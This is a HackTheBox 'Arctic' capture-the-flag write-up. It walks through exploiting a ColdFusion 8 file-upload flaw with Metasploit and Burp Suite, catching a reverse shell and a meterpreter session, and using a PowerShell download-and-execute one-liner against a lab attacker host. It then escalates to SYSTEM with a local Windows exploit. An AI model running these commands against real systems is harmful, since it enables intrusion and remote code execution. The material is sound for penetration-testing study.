# HackTheBox Arctic Writeup

![date](https://img.shields.io/badge/date-01.17.2019-brightgreen.svg)  
![solved in time of CTF](https://img.shields.io/badge/solved-in%20time%20of%20CTF-brightgreen.svg)  
![web category](https://img.shields.io/badge/category-web-lightgrey.svg)
![score](https://img.shields.io/badge/score-0-blue.svg)
![solves](https://img.shields.io/badge/solves-845-brightgreen.svg)

## Summary
Exploit: https://arrexel.com/coldfusion-8-0-1-arbitrary-file-upload/

ColdFusion 8 has an arbitrary file upload vulnerability that is fairly easy to exploit. 
There is a Metasploit module available to do the job. However, due to the request delay to 
ihe target, the Metasploit module fails to run and must be intercepted in Burp Suite, then 
requested through Burp Repeater. A standalone proof of concept was created for this writeup. 
Refer to the link above.

## root flag
```
FLAG{}
```

## Detailed solution

### Nmap target(10.10.10.11)

    > nmap -sC -sV -oA 10.10.10.11
Find suspicious port 8500, Adobe CodeFusion 8
    10.10.10.11:8500/CFIDE/administrator/

### Search exploits about coldfusion ans try to exploit.
    
    > searchsploit coldfusion

    > msfconsole

    msf > search coldfusion
    msf > use exploit/windows/http/coldfusion_fckeditor
    msf exploit(coldfusion_fckeditor) > show options
    msf exploit(coldfusion_fckeditor) > set RHOST 10.10.10.11
    msf exploit(coldfusion_fckeditor) > set RPORT 8500
    msf exploit(coldfusion_fckeditor) > run
    msf exploit(coldfusion_fckeditor) > show advanced options
    msf exploit(coldfusion_fckeditor) > set VERBOSE true
    msf exploit(coldfusion_fckeditor) > run

### Use Burp Suite to intercept requests and redirect them to target
Use Burp Suite to intercept requests and send them through Burp Repeater.
    
    Open 'Proxy' panel and select 'Options', select 'Add', 
    set Bind to port 8500, 
    set Redirect to host: 10.10.10.11
    set Redirect to port: 8500
    select OK

Fullfill browser address line with 'localhost:8500'. Then Set exploit/windows/http/coldfusion_fckeditor RHOST to 127.0.0.1    

    msf exploit(coldfusion_fckeditor) > set RHOST 127.0.0.1
    msf exploit(coldfusion_fckeditor) > run

Msfconsole's default listening port is 4444 on vpn ip address. But because of request 
default delay time is 30 seconds, so msfconsole cannot get reverse meterpreter shell 
successfully. SO YOU SHOULD GET REVERSE SHELL MANNUALLY.

    > ncat -lvnp 4444
    > 10.10.10.11:8500/userfiles/file/K.jsp
    
Getting a reverse shell is not enough. You should get a meterpreter shell.

    > /opt/unicorn/unicorn.py windows/meterpreter/reverse_tcp 10.10.14.2 31337
    > msfconsole -r unicorn.rc

How to copy reverse shell to target machine(10.10.10.11)
    
    > cat powershell_attack.txt | xclip
    > vim exploit.html

Then paste shellcode from system clipboard to exploit.html, and delete the powershell 
cmd prompt.

    > python -m SimpleHTTPServer
    10.10.10.11 > powershell "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2:8000/exploit.html')"
    
Check if you've got the root access.

    meterpreter > sysinfo 
    meterpreter > getuid

### Post exploit

####Collect x86 exploits.    

    msf exploit(handler) > search suggest
    msf exploit(handler) > use post/multi/recon/local_exploit_suggester
    msf post(local_exploit_suggester) > show options
    msf post(local_exploit_suggester) > set SESSION 1
    msf post(local_exploit_suggester) > run
    
####Collect x64 exploits.

    meterpreter > ps
    meterpreter > migrate [x64 version conhost.exe PID]

    meterpreter > sysinfo 
    
You should now get x64 system id.

    msf post(local_exploit_suggester) > run
    msf post(local_exploit_suggester) > use exploit/windows/local/ms10_092_schelevator
    msf exploit(ms10_092_schelevator) > show options
    msf exploit(ms10_092_schelevator) > set SESSION 1
    msf exploit(ms10_092_schelevator) > set LHOST 10.10.14.2
    msf exploit(ms10_092_schelevator) > run

    meterpreter > getuid
    
If you see "NT AUTHORITY\SYSTEM", it means you get the root access.
